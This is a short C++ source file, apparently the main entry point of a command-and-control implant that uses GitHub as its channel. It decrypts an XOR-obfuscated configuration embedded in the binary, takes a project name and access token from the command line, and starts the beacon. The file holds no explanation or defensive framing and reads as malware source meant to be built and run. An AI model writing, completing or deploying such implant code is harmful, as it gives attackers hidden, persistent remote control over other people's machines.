#include "BeaconGithub.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string project = "";
	if(argc > 1)
		project = argv[1];

	std::string token = "";
	if (argc > 2)
		token = argv[2];

	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconGithub>(configDecrypt, project, token);

	beacon->run();
}